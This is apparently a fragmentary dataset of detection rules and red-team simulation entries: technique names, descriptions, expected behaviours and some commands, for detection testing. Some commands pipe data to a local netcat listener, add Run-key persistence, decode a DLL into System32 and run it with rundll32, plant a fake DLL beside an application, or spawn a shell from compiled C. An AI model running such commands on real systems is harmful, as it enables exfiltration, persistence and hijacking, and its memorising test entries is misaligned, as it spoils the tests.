rules.title: Suspicious Script Execution from Archive Utility with Phishing Document
rules.description: Detects user execution of malicious scripts from archive utilities referencing a specific phishing document associated with PlugX malware delivery

selection_cl.CommandLine|contains: draft letter to European Commission RUSSIAN OIL PRICE CAP sg de.doc

detection.condition: (selection_parent or selection_sfx) and selection_child and selection_cl and not exclusion

falsepositives: Legitimate self-extracting archives from trusted vendors
User-initiated extraction of archived scripts with similar naming conventions

rules.title: DLL Search Order Hijacking via LMIGuardianSvc.exe

detection.condition: selection and (parent_image_selection or child_image_selection) and not exclusion_negation

falsepositives: Legitimate use of WinRAR self-extracting archives that include files with similar naming patterns.
Signed scripts or HTA files that process data files in a legitimate context.
Automated software deployment tools that use script hosts to extract configuration data.

attacks.description: Downloads a benign executable from a local URL using certutil and executes it
attacks.expected_behavior: The benign executable will be downloaded and executed

attacks.description: Executes notepad.exe using PowerShell Start-Process cmdlet
attacks.expected_behavior: Notepad will be launched

attacks.description: Creates a directory and a file in the temp directory and opens the file with notepad
attacks.expected_behavior: A directory and a file will be created, and the file will be opened with notepad

attacks.description: Basic command to execute a malicious script
attacks.expected_behavior: The malicious script will be executed, simulating user execution of a malicious file.

attacks.description: Intermediate command to execute a malicious script with a parameter
attacks.expected_behavior: The malicious script will be executed with the specified parameter, simulating user execution of a malicious file with parameters.

attacks.description: Advanced command to execute a malicious script with a parameter and handle potential errors
attacks.expected_behavior: The malicious script will be executed with the specified parameter, and any error messages will be redirected to /dev/null, simulating user execution of a malicious file with parameters and error handling.

attacks.description: Create a directory for the malicious DLL, create the malicious DLL with a benign string, and verify execution using whoami.exe
attacks.expected_behavior: The malicious DLL will be created and the whoami.exe will be executed, demonstrating the DLL Search Order Hijacking technique

attacks.description: Copy the legitimate whoami.exe to the same directory as the malicious DLL and execute it using cmd.exe
attacks.expected_behavior: The malicious DLL will be loaded when the legitimate whoami.exe is executed, demonstrating the DLL Search Order Hijacking technique

attacks.command: powershell -Command "Add-Type -TypeDefinition 'using System; class Malicious { static void Main() { Console.WriteLine("benign string"); } }'; [Malicious]::Main()"
attacks.description: Create a malicious DLL using PowerShell and execute it
attacks.expected_behavior: The malicious DLL will be created and executed, demonstrating the DLL Search Order Hijacking technique

attacks.description: Compile a malicious library to hijack the DLL search order
attacks.expected_behavior: A malicious library is compiled and ready to be used for DLL hijacking

attacks.description: Set the LD_PRELOAD environment variable to point to the malicious library
attacks.expected_behavior: The LD_PRELOAD environment variable is set, preparing for the hijacking

attacks.description: Execute a program that would normally load a legitimate library, but due to LD_PRELOAD, loads the malicious one instead
attacks.expected_behavior: The malicious library is loaded instead of the legitimate one, demonstrating DLL Search Order Hijacking

attacks.description: Decode a file using certutil
attacks.expected_behavior: The encoded file will be decoded and saved as a new file.

attacks.description: Decode a Base64 string using PowerShell
attacks.expected_behavior: The decoded string will be printed to the console.

attacks.description: Create an encoded file and decode it using certutil
attacks.expected_behavior: The encoded file will be created, decoded, and saved as a new file.

attacks.description: Decodes a base64 encoded string using the base64 command.
attacks.expected_behavior: The command decodes the base64 string 'SGVsbG8gd29ybGQh' to 'Hello world!' and prints it to the console.

attacks.description: Decodes the contents of a file named encoded.txt using base64 and saves the decoded content to a new file named decoded.txt.
attacks.expected_behavior: The command reads the encoded.txt file, decodes its content using base64, and writes the decoded content to decoded.txt.

attacks.description: Decodes a base64 encoded string using process substitution and saves the output to a file named output.txt.
attacks.expected_behavior: The command decodes the base64 string 'SGVsbG8gd29ybGQh' to 'Hello world!' and saves it to output.txt.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic command to encode a test string and send it over a command and control channel
attacks.expected_behavior: The command will encode a test string and send it over a hypothetical command and control channel

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate command to compress a test file and send it over a command and control channel
attacks.expected_behavior: The command will compress a test file and send it over a hypothetical command and control channel

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced command to encode a test string and send it over a command and control channel using a legacy binary
attacks.expected_behavior: The command will encode a test string and send it over a hypothetical command and control channel using a legacy binary

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Simulate exfiltrating test data over a local C2 channel using netcat.
attacks.expected_behavior: The command sends the string 'Test Data' encoded in base64 to a local netcat listener on port 8080, simulating data exfiltration.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: (echo 'More Test Data'; echo 'Even More') | base64 | nc 127.0.0.1 8080
attacks.description: Simulate exfiltrating multiple lines of test data over a local C2 channel.
attacks.expected_behavior: The command sends multiple lines of test data encoded in base64 to a local netcat listener on port 8080, demonstrating the exfiltration of varied data.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Simulate exfiltrating a system file (/etc/hosts) over a local C2 channel.
attacks.expected_behavior: The command sends the contents of /etc/hosts encoded in base64 to a local netcat listener on port 8080. This simulates the exfiltration of system data and requires caution as it involves actual system files.

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "cmd.exe /c echo Hello World > %TEMP%\test.txt" /f
attacks.description: Add a new key to the Run registry to execute a command at login
attacks.expected_behavior: A new file test.txt will be created in the temp directory with the content 'Hello World' after the user logs in

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "cmd.exe /c echo Hello World > %TEMP%\test.txt" /f
attacks.description: Modify an existing key in the Run registry to execute a different command at login
attacks.expected_behavior: The existing file test.txt in the temp directory will be overwritten with the content 'Hello World' after the user logs in

attacks.description: Use PowerShell to add a new key to the Run registry to execute a command at login
attacks.expected_behavior: A new file test.txt will be created in the temp directory with the content 'Hello World' after the user logs in

attacks.description: Basic: Add a cron job to simulate persistence by periodically touching a file.
attacks.expected_behavior: A new cron job is added to run every minute, touching a file in /tmp to simulate persistence.

attacks.description: Intermediate: Modify the cron table to include a job that runs at reboot, simulating persistence across system restarts.
attacks.expected_behavior: Upon reboot, the system touches a file in /tmp, demonstrating persistence.

attacks.description: Advanced: Enable a systemd user service to persist across reboots, simulating advanced persistence techniques.
attacks.expected_behavior: The systemd service is enabled for the user, demonstrating persistence through system services.

attacks.description: Enumerate processes with a main window title using PowerShell.
attacks.expected_behavior: Lists the titles of application windows.

attacks.description: Use the tasklist command to list detailed information about running processes, including their window titles.
attacks.expected_behavior: Displays detailed information about running processes, including window titles.

attacks.command: powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; Add-Type -AssemblyName System.Windows.Forms; [Microsoft.VisualBasic.Interaction]::Shell("cmd.exe /c title TestWindow & echo TestWindow"); [System.Windows.Forms.MessageBox]::Show('Test Message')"
attacks.description: Create a new window with a title and display a message box using PowerShell and .NET assemblies.
attacks.expected_behavior: Creates a new command prompt window with the title 'TestWindow' and displays a message box with 'Test Message'.

attacks.description: Display information about the root window
attacks.expected_behavior: The command will display information about the root window, including its size, position, and class.

attacks.description: Search for windows with the class 'firefox'
attacks.expected_behavior: The command will search for windows with the class 'firefox' and return their window IDs.

attacks.description: Activate the first window with the class 'firefox'
attacks.expected_behavior: The command will activate the first window with the class 'firefox', bringing it to the foreground.

attacks.description: Create a new registry run key using reg.exe
attacks.expected_behavior: A new registry key 'TestKey' is created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run with the value 'C:\\Windows\\System32\\cmd.exe'

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestKey /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f && reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestKey
attacks.description: Create a new registry run key and query its value using reg.exe
attacks.expected_behavior: A new registry key 'TestKey' is created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run with the value 'C:\\Windows\\System32\\cmd.exe', and its value is queried and displayed

attacks.description: Create a new registry run key using PowerShell
attacks.expected_behavior: A new registry key 'TestKey' is created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run with the value 'C:\\Windows\\System32\\cmd.exe'

attacks.description: Modifies the user's crontab to schedule a task every 5 minutes to create a file in /tmp, simulating persistence.
attacks.expected_behavior: A new file named testfile will be created in /tmp every 5 minutes.

attacks.description: Modifies a system configuration file (/etc/testconfig) by appending a test string, requiring admin privileges.
attacks.expected_behavior: A new file named testconfig will be created in /etc containing 'teststring'.

attacks.description: Modifies the fstab file by replacing the first commented line with 'teststring', simulating a persistence technique that alters system configuration files.
attacks.expected_behavior: The first commented line in /etc/fstab will be replaced with 'teststring'.

attacks.description: Create a file named test.txt.exe in the Public directory to demonstrate masquerading.
attacks.expected_behavior: A file named test.txt.exe is created in the Public directory without triggering defense mechanisms.

attacks.description: Use PowerShell to create a file with a double extension (.docx.ps1) to masquerade as a document but execute as a script.
attacks.expected_behavior: A file named test.docx.ps1 is created, and when executed, it prints "Masquerading test" to the console.

attacks.description: Decode a file named test.pdf.txt in the TEMP directory using certutil, then display its contents using type, demonstrating how a malicious file could be disguised and executed.
attacks.expected_behavior: The contents of the test.pdf.txt file are displayed in the command prompt, showing how a file with a double extension can be processed.

attacks.description: Create a file with a double extension (.txt.pdf) to masquerade as a legitimate PDF file.
attacks.expected_behavior: A file named test.txt.pdf will be created in the user's home directory, potentially evading defenses that filter based on file extensions.

attacks.description: Create a file with a double extension (.sh.exe) containing a benign string to masquerade as a legitimate executable file.
attacks.expected_behavior: A file named test.sh.exe will be created in the user's home directory, containing the string 'This is a test', potentially evading defenses that filter based on file extensions.

attacks.description: Create a file with a double extension (.conf.dll) in a system directory to masquerade as a legitimate configuration file, requiring admin privileges.
attacks.expected_behavior: A file named test.conf.dll will be created in the /etc directory, potentially evading defenses that filter based on file extensions. This command requires admin privileges and poses a higher safety risk due to its potential impact on system configuration.

attacks.command: powershell -Command "'Hello World' -replace ' ', [char]0x20; $encoded = [System.Text.Encoding]::UTF8.GetBytes('Hello World'); $encoded | ForEach-Object { $_ -bxor 0x13 } | Set-Content -Path '$env:TEMP\encoded.bin' -Encoding Byte"
attacks.description: This command encodes a string using XOR with a key of 0x13 and saves it to a file in %TEMP%.
attacks.expected_behavior: The command will create an encoded file in %TEMP% without causing any harm to the system.

attacks.description: This command uses certutil to encode a file using Base64 and saves it to another file in %TEMP%.
attacks.expected_behavior: The command will create an encoded file in %TEMP% without causing any harm to the system.

attacks.description: This command decodes a file that was previously encoded using XOR with a key of 0x13 and saves the decoded content to another file in %TEMP%.
attacks.expected_behavior: The command will create a decoded file in %TEMP% without causing any harm to the system.

attacks.command: echo 'Hello World' > file.txt; xor_file=$(xxd -p file.txt); echo $xor_file > encrypted.txt
attacks.description: This command creates a file named 'file.txt' with the content 'Hello World', then uses the xxd command to convert the file to a hexadecimal representation, and finally writes the encrypted content to a new file named 'encrypted.txt'. This demonstrates a basic form of obfuscation using XOR.
attacks.expected_behavior: The command will create two new files, 'file.txt' and 'encrypted.txt', in the current working directory.

attacks.description: This command uses the OpenSSL library to encrypt the 'file.txt' file using the AES-256-CBC algorithm and writes the encrypted content to a new file named 'encrypted.txt'. This demonstrates an intermediate form of obfuscation using a more secure encryption algorithm.
attacks.expected_behavior: The command will create a new file named 'encrypted.txt' in the current working directory, which contains the encrypted content of 'file.txt'.

attacks.description: This command uses the base64 command to encode the 'file.txt' file, then writes the encoded content to a new file named 'encoded.txt'. The command then uses the gzip command to compress the 'encoded.txt' file. This demonstrates an advanced form of obfuscation using multiple layers of encoding and compression.
attacks.expected_behavior: The command will create a new file named 'encoded.txt.gz' in the current working directory, which contains the encoded and compressed content of 'file.txt'.

attacks.description: Decodes a test file using certutil, potentially mimicking decoding of phishing payloads
attacks.expected_behavior: Creates a decoded file in the temp directory

attacks.description: Creates a file with a benign string using PowerShell, simulating creation of phishing-related files
attacks.expected_behavior: Creates a text file in the temp directory with the string 'Hello World'

attacks.command: cmd /c echo This is a test > %TEMP%\phish_test.bat && start %TEMP%\phish_test.bat
attacks.description: Creates a batch file with a benign command and executes it, potentially mimicking execution of phishing payloads
attacks.expected_behavior: Creates and executes a batch file in the temp directory, displaying the command prompt

attacks.command: echo 'This is a phishing email' | mail -s 'Test Email' user@example.com
attacks.description: Simulate sending a phishing email using the mail command.
attacks.expected_behavior: An email with the subject 'Test Email' and body 'This is a phishing email' will be sent to the specified email address.

attacks.command: curl -X POST -H 'Content-Type: application/json' -d '{"email":"user@example.com","message":"This is a phishing message"}' http://localhost/phishing
attacks.description: Simulate sending a phishing message using curl to a local HTTP endpoint.
attacks.expected_behavior: A POST request with a JSON body containing a phishing message will be sent to the specified HTTP endpoint.

attacks.command: ssh user@localhost 'echo "This is a phishing message" | mail -s "Test Email" user@example.com'
attacks.description: Simulate sending a phishing email using SSH to execute a command on a local machine.
attacks.expected_behavior: An email with the subject 'Test Email' and body 'This is a phishing message' will be sent to the specified email address using the SSH connection.

attacks.command: cmd.exe /c "echo Fake DLL > %TEMP%\example.dll && copy /Y %TEMP%\example.dll \"C:\Program Files\SomeApp\example.dll\" && \"C:\Program Files\SomeApp\app.exe\""
attacks.description: Create a dummy DLL in %TEMP%, copy it to the same folder as a legitimate executable, and launch the executable so it loads the attacker‑provided DLL via normal search order.
attacks.expected_behavior: The legitimate application loads the fake DLL from its directory, demonstrating DLL search order hijacking without requiring elevated privileges.

attacks.command: cmd.exe /c "echo TVq... > %TEMP%\mal.dll.b64 && certutil -decode %TEMP%\mal.dll.b64 C:\Windows\System32\mal.dll && rundll32.exe C:\Windows\System32\mal.dll,EntryPoint"
attacks.description: Write a base64‑encoded placeholder DLL to a .b64 file, decode it into the System32 directory (requires admin), and execute it with rundll32 to show that a system‑wide library can be hijacked.
attacks.expected_behavior: The system loads the attacker‑placed DLL from System32, illustrating hijack of a globally searched library. Administrative rights are needed to write to System32.

attacks.description: Create a symbolic link named like the expected DLL that points to a malicious DLL stored in %TEMP%, then run the target executable so it follows the symlink and loads the attacker DLL.
attacks.expected_behavior: When the application starts, Windows resolves the DLL name to the symlink, loading the malicious DLL from %TEMP%, demonstrating hijack via symbolic link. Requires admin to create the symlink.

attacks.description: Creating a symbolic link to hijack the execution of a command
attacks.expected_behavior: The command creates a symbolic link named 'executable' in /tmp that points to /bin/bash. When executed, it runs the command 'echo Hijacked Execution Flow', demonstrating how an attacker could hijack the execution flow of a process.

attacks.description: Manipulating the PATH environment variable to hijack the execution of a command
attacks.expected_behavior: This command manipulates the PATH environment variable to include /tmp at the beginning. It then creates a file named 'ls' in /tmp, makes it executable, and writes 'echo Hijacked' to it. When 'ls' is executed, it will run the hijacked version instead of the original command, demonstrating how an attacker could manipulate environment variables to hijack execution flow.

attacks.command: echo 'int main() { system("/bin/bash"); return 0; }' > hijack.c; gcc hijack.c -o hijack; ./hijack
attacks.description: Compiling a C program to hijack the execution flow by executing a shell
attacks.expected_behavior: This command creates a C program that, when compiled and executed, will spawn a new bash shell. This demonstrates how an attacker might use compiled code to hijack execution flow, potentially evading detection by executing a shell from a seemingly innocuous program.

attacks.description: Generate a self-signed certificate using certutil.exe
attacks.expected_behavior: A self-signed certificate will be generated at the specified path.

attacks.description: Create an encrypted channel using the generated certificate and establish a connection to a remote server
attacks.expected_behavior: An encrypted channel will be established, and a connection will be made to the remote server.

attacks.description: Create an encrypted channel and store encrypted data in a file
attacks.expected_behavior: An encrypted channel will be created, and encrypted data will be stored in the specified file.

attacks.description: Encrypt a file using AES-256-CBC
attacks.expected_behavior: The plaintext.txt file will be encrypted and saved as encrypted.txt

attacks.description: Decrypt the encrypted file
attacks.expected_behavior: The encrypted.txt file will be decrypted and saved as decrypted.txt

attacks.description: Establish an encrypted connection to a server
attacks.expected_behavior: An encrypted connection will be established to the specified server

attacks.description: Encode a benign text file to Base64 using the built‑in certutil utility.
attacks.expected_behavior: Creates %TEMP%\sample.b64 containing the Base64 representation of sample.txt without modifying the original file.

attacks.command: powershell -Command "$data='Test data for exfiltration'; $bytes=[System.Text.Encoding]::UTF8.GetBytes($data); $b64=[Convert]::ToBase64String($bytes); Set-Content -Path $env:TEMP\exfil.b64 -Value $b64 -Encoding ASCII"
attacks.description: Encode a string to Base64 in PowerShell and write the result to a temporary file.
attacks.expected_behavior: Creates %TEMP%\exfil.b64 containing the Base64‑encoded version of the test string.

attacks.description: Execute a Base64‑encoded PowerShell command (Write-Output 'test') to demonstrate hidden command transmission.
attacks.expected_behavior: Outputs the string 'test' to the console, confirming that the encoded command was successfully decoded and executed.

attacks.description: Basic example of encoding a string using base64.
attacks.expected_behavior: The string 'Hello, World!' will be encoded in base64 and printed to the console.

attacks.description: Intermediate example decoding a base64 encoded string.
attacks.expected_behavior: The base64 encoded string 'SGVsbG8sIFdvcmxkIQ==' will be decoded and printed to the console, displaying 'Hello, World!'.

attacks.command: echo 'This is a test string' | base64 > encoded.txt; base64 --decode encoded.txt
attacks.description: Advanced example that encodes a string, saves it to a file, and then decodes the file content.
attacks.expected_behavior: The string 'This is a test string' will be encoded and saved to a file named 'encoded.txt', then the content of 'encoded.txt' will be decoded and printed to the console, displaying the original string.

attacks.description: Create a new system service using sc.exe
attacks.expected_behavior: A new system service named TestService will be created

attacks.description: Modify an existing system service using net.exe
attacks.expected_behavior: The TestService system service will be started

attacks.description: Create a new system process using PowerShell
attacks.expected_behavior: A new Notepad process will be created

attacks.description: Start a new system service named mytestservice
attacks.expected_behavior: The command starts a new system service named mytestservice, demonstrating the creation of a system process.

attacks.description: Modify the system startup to include mytestservice
attacks.expected_behavior: The command updates the system startup to include mytestservice, demonstrating the modification of system processes.

attacks.description: Enable a system service named mytestservice to start at boot
attacks.expected_behavior: The command enables the system service named mytestservice to start at boot, demonstrating the modification of system processes.

attacks.description: Basic example using cmd.exe to create a file in the temp directory
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World'

attacks.description: Intermediate example using PowerShell to compress a file
attacks.expected_behavior: Compresses the test.txt file into a zip archive named test.zip in the temp directory

attacks.description: Advanced example using PowerShell to encode a command and save it to a file
attacks.expected_behavior: Encodes the command 'Get-ChildItem -Path %TEMP%' in Base64 and saves it to a file named encoded.txt in the temp directory

attacks.description: Basic command execution using bash to create a file
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Hello World'

attacks.command: bash -c '(echo Hello World; echo This is a test) > /tmp/test.txt'
attacks.description: Intermediate command demonstrating multiple commands execution
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Hello World' and 'This is a test' on separate lines

attacks.command: bash -c 'for i in {1..5}; do echo $i >> /tmp/numbers.txt; done'
attacks.description: Advanced command using a for loop to generate numbers
attacks.expected_behavior: Creates a file named numbers.txt in /tmp and appends the numbers 1 through 5, one per line

attacks.description: Downloads a benign file using certutil, simulating exploitation of a public-facing application.
attacks.expected_behavior: The command downloads a file from a specified URL to the temp directory.

attacks.description: Decodes a base64 string using PowerShell and writes the output to a file, simulating more complex exploitation techniques.
attacks.expected_behavior: The command decodes a base64 string and writes 'Hello world' to a file in the temp directory.

attacks.description: Establishes a connection to a hypothetical vulnerable service using net.exe, emulating real-world exploitation.
attacks.expected_behavior: The command attempts to enumerate domain users, which could be part of exploiting a vulnerable service.

attacks.description: Simulated XSS attack on a public-facing web application
attacks.expected_behavior: The command attempts to simulate an XSS attack by injecting a script tag into a parameter. The expected behavior is for the web application to reflect the input, potentially executing the script in the context of the user's browser, though in a real test scenario, this should be caught by web application firewalls or input validation.

attacks.description: Simulated exploit upload to a public-facing web server
attacks.expected_behavior: This command simulates uploading an exploit (in this case, a PDF file) to a public-facing web server. The exploit is first downloaded to a temporary location and then copied to the web server's document root. The expected behavior is for the web server to serve the uploaded file, potentially allowing an attacker to exploit vulnerabilities in the server or its users' browsers.

attacks.description: Simulated SQL injection attack using sqlmap
attacks.expected_behavior: This command uses sqlmap to simulate a SQL injection attack against a public-facing web application. The expected behavior is for sqlmap to attempt to inject SQL code into the application's database, potentially allowing an attacker to extract or modify sensitive data. However, due to the potential for actual harm, this command is marked as high safety risk and should only be used in highly controlled and legal testing environments.

attacks.description: Using makecab to archive a test file
attacks.expected_behavior: Creates a cabinet archive of a test file in the temp directory

attacks.description: Using PowerShell to compress a test file into a zip archive
attacks.expected_behavior: Creates a zip archive of a test file in the temp directory, overwriting any existing file

attacks.description: Using PowerShell with .NET to create a zip archive from a directory
attacks.expected_behavior: Creates a zip archive from the contents of a test directory in the temp directory

attacks.command: echo 'Test data' > test_file.txt; tar -czf test_archive.tar.gz test_file.txt; rm test_file.txt
attacks.description: Create a test file, archive it, and remove the original file
attacks.expected_behavior: The command will create a test file, archive it, and remove the original file without errors

attacks.description: Archive the hosts file
attacks.expected_behavior: The command will archive the hosts file without errors

attacks.description: Archive files in the /tmp directory
attacks.expected_behavior: The command will archive files in the /tmp directory without errors

attacks.description: Download and execute a benign file using certutil
attacks.expected_behavior: The benign file will be downloaded and executed

attacks.description: Download and execute a benign script using PowerShell
attacks.expected_behavior: The benign script will be downloaded and executed

attacks.description: Encode and execute a benign command using PowerShell
attacks.expected_behavior: The benign command will be executed and a file will be created

attacks.description: Basic example of creating and executing a malicious file
attacks.expected_behavior: The command creates a file named malicious_file.txt, makes it executable, and then executes it.

attacks.description: Intermediate example of downloading and executing a malicious file
attacks.expected_behavior: The command downloads a file from a URL, makes it executable, and then executes it. Note: This command assumes internet access and uses a benign URL for demonstration purposes.

attacks.description: Advanced example of creating and executing a malicious file with elevated privileges
attacks.expected_behavior: The command creates a file in the /tmp directory, makes it executable, and then executes it with elevated privileges using sudo.
